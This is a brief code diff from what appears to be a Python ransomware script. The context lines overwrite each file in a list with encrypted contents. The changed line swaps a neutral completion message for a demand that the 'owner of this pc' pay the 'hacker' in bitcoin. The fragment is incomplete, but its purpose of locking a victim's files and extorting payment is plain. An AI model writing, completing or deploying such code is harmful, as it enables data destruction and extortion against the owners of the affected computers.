@@ -31,4 +31,4 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
 
-print("Encryption complete.")
+print("Toss a bitcoin to your hacker O' owner of this pc!")
